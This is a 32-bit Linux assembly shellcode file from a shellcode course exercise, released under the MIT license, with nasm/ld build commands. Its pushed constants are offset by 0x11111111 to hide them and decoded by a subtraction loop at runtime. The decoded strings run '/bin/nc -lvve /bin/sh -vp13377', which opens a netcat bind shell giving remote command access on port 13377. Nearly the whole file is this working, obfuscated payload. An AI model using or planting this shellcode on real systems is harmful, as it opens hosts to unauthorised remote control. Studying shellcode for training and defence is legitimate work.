; Modified version of shellcode-804
; This was created as part of the SecurityTube Linux Assembly Expert
; course at http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
;
; Travis Mathison
;
; The MIT License (MIT)
; 
; Copyright (c) 2018 Travis Mathison
;
; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:
;
; The above copyright notice and this permission notice shall be included in all
; copies or substantial portions of the Software.
;
; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
; SOFTWARE.
;
; BUILD:
; nasm -f elf32 ./shellcode-804-modified.nasm -o shellcode-804-modified.o
; ld ./shellcode-804-modified.o -o shellcode-804-modified

section .text
    global _start

_start:
    xor eax,eax
    mov eax,0x11111111
    xor edx,edx
    push 0x48484444
    push 0x4281873e
    mov edx, esp
    push eax
    push 0x7984407f
    push 0x7a734076
    push 0x87877d3e
    mov ecx,esp
    push eax
    push 0x747f4040
    push 0x40404040
    push 0x7f7a7340
    mov ebx, esp
    push eax
    push edx
    push ecx
    push ebx
    xor edx,edx
    mov al,11
    xor ecx,ecx
    mov cl,0xb
    mov eax,ecx
sub_loop:
    sub dword [esp+8+ecx*4],0x11111111
    dec cx
    jnz sub_loop

    mov ecx,esp
    int 0x80

; ecx = 10

